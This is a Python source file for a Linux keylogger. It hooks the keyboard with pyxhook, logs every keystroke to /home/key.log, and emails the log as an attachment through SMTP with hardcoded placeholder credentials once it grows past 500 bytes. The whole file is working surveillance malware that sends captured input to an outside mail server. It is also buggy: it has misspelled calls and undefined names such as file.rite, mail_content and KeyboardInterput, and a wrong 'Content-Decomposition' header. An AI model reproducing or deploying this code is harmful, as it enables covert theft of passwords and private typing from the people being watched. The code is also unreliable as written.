import os
import pyxhook
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

content = "Keylogger current status."
sender_mail = "sender@mail.com"
sender_passwd = "senderpassword"
receiver_mail = "cc@mail.com"

message = MIMEMultipart()
message["From"] = sender_mail
message["To"] = receiver_mail
message["Subject"] = "Keylogger current status with record log file"

logger = os.environ.get('log_file',os.path.expanduser('/home/key.log'))
cancel = ord(os.environ.get('cancel','`')[0])

if os.environ.get('log_clean', None) is not None:
    try:
        os.remove(logger)
    except Exception:
        pass

def KeyPress(event):
    file = open(logger,'a')
    meth = str(event.Key).lower()
    if meth == "space":
        file.write(" ")
    elif meth == "tab":
        file.write(" <TAB> ")
    elif meth == "return":
        file.rite("\n")
    elif meth == "period":
        file.write(".")
    elif meth == "backspace":
        file.write(" |backspace| ")
    elif meth == "control_l":
        file.write("<CTRL_L> ")
    elif meth == "control_r":
        file.write("<CTRL_R> ")
    elif meth == "shift_l":
        file.write("<SHIFT_L> ")
    elif meth == "shift_r":
        file.write("<SHIFT_R> ")
    else:
        file.write("{}".format(event.Key))

    if int(file.tell()) > 500:
        message.attach(MIMEText(mail_content, "plain"))
        filename = "/home/key.log"
        attach_file = open(filename, 'rb')
        payload = MIMEBase("application","octate-stream")
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        payload.add_header("Content-Decomposition","attachment",filename=filename)
        message.attach(payload)
        #SMTP Session
        session = smtplib.SMTP("smtp.mail.com",417)
        session.starttls()
        session.login(sender_mail,sender_passwd)
        text = message.as_string()
        session.sendmail(sender_mail,receiver_mail,text)
        session.quit()
        #Mail Sent


hook = pyxhook.HookManager()
hook.KeyDown = KeyPress
hook.HookKeyboard()

try:
    hook.start()
except KeyboardInterput:
    pass

except Exception:
    message = "An error occured:\n {}".format(Exception)
    pyxhook.print_err(message)
    f = open(logger,'a')
    f.write('\n{}'.format(message))
